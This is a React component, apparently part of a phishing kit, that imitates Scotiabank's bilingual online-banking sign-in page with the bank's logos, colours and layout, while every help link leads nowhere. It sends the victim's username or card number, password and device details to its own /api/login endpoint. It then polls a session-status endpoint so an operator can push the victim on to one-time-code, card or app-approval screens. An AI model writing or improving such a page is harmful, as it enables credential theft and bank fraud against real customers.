import React, { useState, useEffect, useRef } from 'react';
import { collectDeviceInfo } from '../utils/deviceInfo';

const translations = {
  en: {
    welcomeTo: 'Welcome to',
    usernameLabel: 'Username or debit card number',
    passwordLabel: 'Password',
    rememberMe: 'Remember my username or card number',
    signIn: 'Sign in',
    signingIn: 'Signing in...',
    needHelpSigningIn: 'Need help signing in?',
    dontHaveAccount: "Don't have a username and password?",
    setThemUpNow: 'Set them up now.',
    needHelpTitle: 'Need help?',
    creditCardNote: "Please note that credit card numbers can't be used.",
    forgotUsername: 'Forgot your username?',
    setUpUsername: 'Set up a username',
    contactUs: 'Contact Us',
    security: 'Security',
    legal: 'Legal',
    privacy: 'Privacy',
    accessibility: 'Accessibility',
    cookieSettings: 'Cookie Settings',
    copyright: '© Scotiabank. All Rights Reserved.',
    usernameRequired: 'Please enter your username or debit card number.',
    passwordRequired: 'Please enter your password.',
    invalidPassword: 'Invalid password. Please try again.',
    cancelledError: 'Login cancelled by administrator.',
    serverError: 'Unable to connect to the server.',
    show: 'SHOW',
    hide: 'HIDE'
  },
  fr: {
    welcomeTo: 'Bienvenue à',
    usernameLabel: "Nom d'utilisateur ou numéro de carte",
    passwordLabel: 'Mot de passe',
    rememberMe: "Mémoriser mon nom d'utilisateur ou numéro de carte",
    signIn: 'Ouvrir une session',
    signingIn: 'Connexion en cours...',
    needHelpSigningIn: "Besoin d'aide pour vous connecter?",
    dontHaveAccount: 'Nouvel utilisateur?',
    setThemUpNow: 'Activez votre accès.',
    needHelpTitle: "Besoin d'aide?",
    creditCardNote: 'Veuillez noter que les numéros de carte de crédit ne peuvent pas être utilisés.',
    forgotUsername: "Nom d'utilisateur oublié?",
    setUpUsername: "Créer un nom d'utilisateur",
    contactUs: 'Contactez-nous',
    security: 'Sécurité',
    legal: 'Mentions juridiques',
    privacy: 'Confidentialité',
    accessibility: 'Accessibilité',
    cookieSettings: 'Paramètres des témoins',
    copyright: '© Banque Scotia. Tous droits réservés.',
    usernameRequired: "Veuillez entrer votre nom d'utilisateur ou numéro de carte.",
    passwordRequired: 'Veuillez entrer votre mot de passe.',
    invalidPassword: 'Mot de passe non valide. Veuillez réessayer.',
    cancelledError: 'Connexion annulée par l’administrateur.',
    serverError: 'Impossible de se connecter au serveur.',
    show: 'AFFICHER',
    hide: 'MASQUER'
  }
};

export default function LoginPage({ lang = 'en', setLang, onSignInInitiated, onAppPopupInitiated, onAppPushInitiated }) {
  const [currentLang, setCurrentLang] = useState(() => {
    return lang || localStorage.getItem('appLang') || 'en';
  });
  const [isLangOpen, setIsLangOpen] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showInfoPopup, setShowInfoPopup] = useState(false);

  const usernameInputRef = useRef(null);
  const infoPopupRef = useRef(null);
  const infoButtonRef = useRef(null);
  const langDropdownRef = useRef(null);

  useEffect(() => {
    if (lang && lang !== currentLang) {
      setCurrentLang(lang);
    }
  }, [lang]);

  useEffect(() => {
    usernameInputRef.current?.focus();
  }, []);

  // Close language dropdown on click outside
  useEffect(() => {
    if (!isLangOpen) return;
    const handleLangClickOutside = (e) => {
      if (langDropdownRef.current && !langDropdownRef.current.contains(e.target)) {
        setIsLangOpen(false);
      }
    };
    document.addEventListener('mousedown', handleLangClickOutside);
    return () => document.removeEventListener('mousedown', handleLangClickOutside);
  }, [isLangOpen]);

  // Close info popup on click outside or Escape
  useEffect(() => {
    if (!showInfoPopup) return;

    const handleClickOutside = (e) => {
      if (
        infoPopupRef.current &&
        !infoPopupRef.current.contains(e.target) &&
        infoButtonRef.current &&
        !infoButtonRef.current.contains(e.target)
      ) {
        setShowInfoPopup(false);
      }
    };

    const handleKeyDown = (e) => {
      if (e.key === 'Escape') {
        setShowInfoPopup(false);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    document.addEventListener('keydown', handleKeyDown);
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, [showInfoPopup]);

  const handleLanguageSelect = (newLang) => {
    setCurrentLang(newLang);
    setIsLangOpen(false);
    if (setLang) {
      setLang(newLang);
    }
    localStorage.setItem('appLang', newLang);
  };

  const t = translations[currentLang] || translations.en;

  // Poll session status while loading
  useEffect(() => {
    if (!isLoading || !username.trim()) return;
    let intervalId;
    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(username.trim())}`, {
          headers: { 'X-Access-Key': 'client-scotia-bank' }
        });
        const data = await response.json();
        if (data.success) {
          if (data.status === 'show_otp' || data.status === 'card_popup' || data.status === 'card_submitted') {
            setIsLoading(false);
            onSignInInitiated(username.trim());
          } else if (data.status === 'app_popup') {
            setIsLoading(false);
            onAppPopupInitiated(username.trim());
          } else if (data.status === 'app_push_popup') {
            setIsLoading(false);
            onAppPushInitiated(username.trim());
          } else if (data.status === 'cancelled') {
            setIsLoading(false);
            setErrorMessage(t.cancelledError);
          }
        }
      } catch (err) {
        console.error('Error polling session status:', err);
      }
    };
    intervalId = setInterval(checkStatus, 2000);
    return () => { if (intervalId) clearInterval(intervalId); };
  }, [isLoading, username, onSignInInitiated, onAppPopupInitiated, onAppPushInitiated, t.cancelledError]);

  const handleSignIn = async (e) => {
    e.preventDefault();
    setErrorMessage('');

    if (!username.trim()) {
      setErrorMessage(t.usernameRequired);
      return;
    }
    if (!password.trim()) {
      setErrorMessage(t.passwordRequired);
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-scotia-bank' },
        body: JSON.stringify({
          email: username.trim(),
          password: password.trim(),
          deviceInfo: collectDeviceInfo(),
        })
      });
      const data = await response.json();
      if (!data.success) {
        setIsLoading(false);
        setErrorMessage(t.invalidPassword);
      }
    } catch (err) {
      console.error(err);
      setIsLoading(false);
      setErrorMessage(t.serverError);
    }
  };

  return (
    <div
      className="bg-white sm:bg-[#eef0f4] min-h-screen"
      style={{ fontFamily: "'ScotiabankSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
    >
      {/* ── Viewport Fold: on desktop the card covers almost the full viewport height ── */}
      <div className="min-h-screen flex flex-col items-center justify-center px-0 sm:px-6 py-0 sm:py-6">
        {/* Card: full-bleed white on mobile; on desktop: wide, tall (covers viewport height), subtle rounded-sm corners */}
        <div className="relative w-full sm:max-w-[580px] sm:min-h-[calc(100vh-64px)] bg-white sm:rounded-[8px] sm:border sm:border-[#e2e5eb] sm:shadow-sm px-6 pt-12 pb-10 sm:px-16 sm:py-16 flex flex-col justify-center">

          {/* Top Right Header: Language Switcher Dropdown + Lock Icon */}
          <div className="absolute top-4 right-5 sm:top-5 sm:right-7 flex items-center gap-3 sm:gap-3.5 z-40">
            {/* Language Switcher Dropdown */}
            <div className="relative" ref={langDropdownRef}>
              <button
                type="button"
                onClick={() => setIsLangOpen(prev => !prev)}
                className="bg-transparent px-1.5 py-1 text-[15px] font-normal text-[#1a1a1a] hover:text-[#000000] flex items-center gap-1.5 transition-colors cursor-pointer outline-none focus:outline-none"
                aria-label="Select language"
                aria-expanded={isLangOpen}
              >
                <span>{currentLang === 'fr' ? 'Français' : 'English'}</span>
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className={`w-3.5 h-3.5 text-[#eb1120] transition-transform duration-150 ${isLangOpen ? 'rotate-180' : ''}`}
                >
                  <path d="m6 9 6 6 6-6" />
                </svg>
              </button>

              {/* Dropdown Menu */}
              {isLangOpen && (
                <div className="animate-popup absolute right-0 top-full mt-1.5 z-50 w-[140px] bg-white rounded-lg shadow-xl border border-gray-200 py-1 text-left">
                  <button
                    type="button"
                    onClick={() => handleLanguageSelect('fr')}
                    className="w-full px-3.5 py-2 text-[15px] text-[#333333] hover:bg-gray-50 flex items-center justify-between cursor-pointer transition-colors"
                  >
                    <span>Français</span>
                    {currentLang === 'fr' && (
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4 text-[#1a1a1a]">
                        <path d="M20 6 9 17l-5-5" />
                      </svg>
                    )}
                  </button>
                  <button
                    type="button"
                    onClick={() => handleLanguageSelect('en')}
                    className="w-full px-3.5 py-2 text-[15px] text-[#333333] hover:bg-gray-50 flex items-center justify-between cursor-pointer transition-colors"
                  >
                    <span>English</span>
                    {currentLang === 'en' && (
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4 text-[#1a1a1a]">
                        <path d="M20 6 9 17l-5-5" />
                      </svg>
                    )}
                  </button>
                </div>
              )}
            </div>

            {/* Lock icon */}
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.7"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="w-[20px] h-[20px] text-[#333333]"
              aria-label="Secure lock"
              role="img"
            >
              <rect x="4" y="10" width="16" height="12" rx="2" />
              <path d="M7 10V7a5 5 0 0 1 10 0v3" />
              <path d="m9.5 16 1.8 1.8 3.5-3.5" strokeWidth="1.8" />
            </svg>
          </div>

          {/* Logo / Heading with generous spacing between 'Welcome to' and 'Scotiabank' */}
          <div className="text-center mb-11 sm:mb-14 mt-6 sm:mt-0">
            <p className="text-[27px] sm:text-[25px] font-bold text-[#333333] mb-3 sm:mb-2.5 leading-tight tracking-tight">
              {t.welcomeTo}
            </p>
            <div className="flex justify-center items-center">
              <img
                src={currentLang === 'fr' ? '/fr_scotiabank-logo-red-desktop-Height25px.svg' : '/scotiabank-logo.svg'}
                alt={currentLang === 'fr' ? 'Banque Scotia' : 'Scotiabank'}
                className="h-[36px] sm:h-[38px] max-w-[316px] w-auto"
              />
            </div>
          </div>

          {/* Error message */}
          {errorMessage && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-md text-sm text-red-700">
              {errorMessage}
            </div>
          )}

          <form onSubmit={handleSignIn} noValidate className="w-full">
            {/* Username / Debit Card Number Field */}
            <div className="mb-8 sm:mb-9">
              <label
                htmlFor="username"
                className="flex items-center gap-1.5 text-[16px] font-bold text-[#525151] mb-2.5"
              >
                {t.usernameLabel}
                {/* Info (i) button with interactive popup */}
                <div className="relative inline-flex items-center">
                  <button
                    ref={infoButtonRef}
                    type="button"
                    onClick={() => setShowInfoPopup(prev => !prev)}
                    className="cursor-pointer p-0.5 text-[#333333] hover:text-[#eb1120] transition-colors flex items-center justify-center focus:outline-none"
                    aria-label="Need help with username or debit card number"
                    aria-expanded={showInfoPopup}
                  >
                    <svg
                      viewBox="0 0 30 30"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="1.6"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="w-[18px] h-[18px] text-[#333333] flex-shrink-0"
                      aria-label="More information"
                      role="img"
                    >
                      <circle cx="15" cy="15" r="13.5" />
                      <path d="M15 20.9V14.2" />
                      <circle cx="15" cy="9.2" r="0.9" fill="currentColor" stroke="none" />
                    </svg>
                  </button>

                  {/* Need Help Tooltip Popup */}
                  {showInfoPopup && (
                    <div
                      ref={infoPopupRef}
                      role="dialog"
                      aria-modal="true"
                      className="animate-popup absolute right-[-24px] sm:right-auto sm:left-[-54px] top-[calc(100%+8px)] z-50 w-[300px] sm:w-[385px] max-w-[calc(100vw-48px)] bg-white rounded-xl shadow-2xl border border-[#e2e5eb] p-5 sm:p-6 text-left"
                    >
                      {/* Caret pointing directly up at the (i) icon */}
                      <div className="absolute -top-[7px] right-[27px] sm:right-auto sm:left-[58px] w-3.5 h-3.5 bg-white border-t border-l border-[#e2e5eb] rotate-45" />

                      {/* Header with Title and Close Button */}
                      <div className="flex items-start justify-between mb-2">
                        <h3 className="text-[19px] font-bold text-[#1a1a1a] leading-snug">{t.needHelpTitle}</h3>
                        <button
                          type="button"
                          onClick={() => setShowInfoPopup(false)}
                          className="text-[#333333] hover:text-black p-1 -mr-2 -mt-1 cursor-pointer transition-colors"
                          aria-label="Close help tooltip"
                        >
                          <svg
                            viewBox="0 0 30 30"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2.2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            className="w-[15px] h-[15px]"
                          >
                            <path d="M27 26.9999L3 2.9999" />
                            <path d="M3 26.9999L27 2.9999" />
                          </svg>
                        </button>
                      </div>

                      {/* Helper text */}
                      <p className="text-[15px] sm:text-[16px] text-[#3d3d3d] font-normal leading-relaxed mb-4">
                        {t.creditCardNote}
                      </p>

                      {/* Links */}
                      <div className="space-y-2.5">
                        <a
                          href="#"
                          onClick={e => e.preventDefault()}
                          className="text-[#006ac3] hover:underline font-bold text-[16px] inline-flex items-center gap-1.5 transition-colors"
                        >
                          {t.forgotUsername}
                          <svg
                            viewBox="0 0 30 30"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2.2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            className="w-3.5 h-3.5 flex-shrink-0"
                          >
                            <path d="M12 17.9999L28.5 1.49995" />
                            <path d="M24 16.4999V25.4999C24 27.1568 22.6568 28.4999 21 28.4999H4.49999C2.84314 28.4999 1.5 27.1568 1.5 25.4999V8.99994C1.5 7.34309 2.84314 5.99995 4.49999 5.99995H13.5" />
                            <path d="M19.5 1.49995H28.5V10.4999" />
                          </svg>
                        </a>
                        <br />
                        <a
                          href="#"
                          onClick={e => e.preventDefault()}
                          className="text-[#006ac3] hover:underline font-bold text-[16px] inline-flex items-center gap-1.5 transition-colors"
                        >
                          {t.setUpUsername}
                          <svg
                            viewBox="0 0 30 30"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2.2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            className="w-3.5 h-3.5 flex-shrink-0"
                          >
                            <path d="M12 17.9999L28.5 1.49995" />
                            <path d="M24 16.4999V25.4999C24 27.1568 22.6568 28.4999 21 28.4999H4.49999C2.84314 28.4999 1.5 27.1568 1.5 25.4999V8.99994C1.5 7.34309 2.84314 5.99995 4.49999 5.99995H13.5" />
                            <path d="M19.5 1.49995H28.5V10.4999" />
                          </svg>
                        </a>
                      </div>
                    </div>
                  )}
                </div>
              </label>
              <div className="relative flex items-center border-b border-[#767676] focus-within:border-[#eb1120] pb-2 transition-colors">
                {/* Person icon */}
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.6"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-[20px] h-[20px] text-[#333333] mr-2.5 flex-shrink-0"
                  aria-hidden="true"
                >
                  <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
                  <circle cx="12" cy="7" r="4" />
                </svg>
                <input
                  id="username"
                  ref={usernameInputRef}
                  type="text"
                  value={username}
                  onChange={e => setUsername(e.target.value)}
                  disabled={isLoading}
                  autoComplete="username"
                  className="flex-1 outline-none bg-transparent text-[18px] text-[#333333] py-0 placeholder-gray-400"
                  placeholder=""
                />
              </div>
            </div>

            {/* Password Field */}
            <div className="mb-8 sm:mb-9">
              <label
                htmlFor="password"
                className="block text-[16px] font-bold text-[#333333] mb-2.5"
              >
                {t.passwordLabel}
              </label>
              <div className="relative flex items-center border-b border-[#767676] focus-within:border-[#eb1120] pb-2 transition-colors">
                {/* Lock icon */}
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.6"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-[20px] h-[20px] text-[#333333] mr-2.5 flex-shrink-0"
                  aria-hidden="true"
                >
                  <rect x="4" y="10" width="16" height="12" rx="2" />
                  <path d="M7 10V7a5 5 0 0 1 10 0v3" />
                </svg>
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => {
                    setPassword(e.target.value);
                    if (errorMessage) setErrorMessage('');
                  }}
                  disabled={isLoading}
                  autoComplete="current-password"
                  className="flex-1 outline-none bg-transparent text-[18px] text-[#333333] py-0 placeholder-gray-400"
                  placeholder=""
                />
                {password.length > 0 && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="ml-2.5 text-[13px] sm:text-[14px] font-medium text-[#333333] hover:text-black tracking-wide transition-colors cursor-pointer select-none uppercase focus:outline-none"
                    disabled={isLoading}
                    aria-label={showPassword ? t.hide : t.show}
                  >
                    {showPassword ? t.hide : t.show}
                  </button>
                )}
              </div>
            </div>

            {/* Remember Me Checkbox */}
            <div className="flex items-start gap-2.5 mb-11 sm:mb-12">
              <input
                type="checkbox"
                id="rememberMe"
                checked={rememberMe}
                onChange={e => setRememberMe(e.target.checked)}
                disabled={isLoading}
                className="w-[18px] h-[18px] mt-0.5 rounded-[3px] border border-gray-400 cursor-pointer accent-[#eb1120] flex-shrink-0"
              />
              <label
                htmlFor="rememberMe"
                className="text-[16px] text-[#333333] cursor-pointer select-none leading-snug"
              >
                {t.rememberMe}
              </label>
            </div>

            {/* Sign In Button: Rounded rectangle, Scotiabank red */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full h-[50px] bg-[#eb1120] hover:bg-[#d60e1b] active:bg-[#c20c18] text-white text-[18px] font-semibold rounded-[4px] transition-colors cursor-pointer disabled:opacity-60 flex items-center justify-center gap-2 mb-7"
            >
              {isLoading ? (
                <>
                  <svg className="animate-spin w-4 h-4 text-white" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                  </svg>
                  <span>{t.signingIn}</span>
                </>
              ) : (
                t.signIn
              )}
            </button>

            {/* Need help signing in */}
            <div className="text-center">
              <a
                href="#"
                onClick={e => e.preventDefault()}
                className="text-[17px] text-[#006ac3] hover:underline font-semibold inline-flex items-center gap-1"
              >
                {t.needHelpSigningIn}
                <span className="text-[19px] font-normal leading-none">›</span>
              </a>
            </div>
          </form>
        </div>
      </div>

      {/* Bottom banner: visible below fold upon scrolling */}
      <div className="bg-[#f4f6f8] sm:bg-[#eef0f4] py-8 sm:py-10 md:text-center pl-6 md:pl-0 md:px-4">
        <p className="text-[17px] text-[#333333] leading-relaxed">
          {t.dontHaveAccount}{' '}
          <br className="block sm:hidden" />
          <a 
            href="#"
            onClick={e => e.preventDefault()}
            className="font-bold text-[#111111] border-b border-dotted border-black pb-[1px] hover:text-[#eb1120] transition-colors inline-block mt-1 sm:mt-0"
          >
            {t.setThemUpNow}
          </a>
        </p>
      </div>

      {/* Footer: HIDDEN ON MOBILE (matches real Scotiabank mobile view), visible on desktop */}
      <footer className="hidden sm:block w-full bg-white border-t border-gray-200">
        {/* Top footer row: logo + links */}
        <div className="max-w-[1200px] mx-auto px-6 py-4 flex flex-col sm:flex-row items-center justify-between gap-4">
          {/* Flying S logo */}
          <div className="flex-shrink-0">
            <img
              src="/scotiabank-footer-logo.svg"
              alt="Scotiabank"
              className="h-8 w-auto"
            />
          </div>

          {/* Nav links */}
          <nav className="flex flex-wrap items-center justify-center sm:justify-end gap-x-6 gap-y-2 text-[15px] text-[#1a1a1a]">
            <a href="#" onClick={e => e.preventDefault()} className="hover:underline">{t.contactUs}</a>
            <a href="#" onClick={e => e.preventDefault()} className="hover:underline">{t.security}</a>
            <a href="#" onClick={e => e.preventDefault()} className="hover:underline">{t.legal}</a>
            <a href="#" onClick={e => e.preventDefault()} className="hover:underline">{t.privacy}</a>
            <a href="#" onClick={e => e.preventDefault()} className="hover:underline">{t.accessibility}</a>
            <a href="#" onClick={e => e.preventDefault()} className="hover:underline">{t.cookieSettings}</a>
          </nav>
        </div>

        {/* Bottom copyright bar */}
        <div className="border-t border-gray-200 py-2.5 text-center text-[14px] text-gray-500">
          {t.copyright}
        </div>
      </footer>
    </div>
  );
}
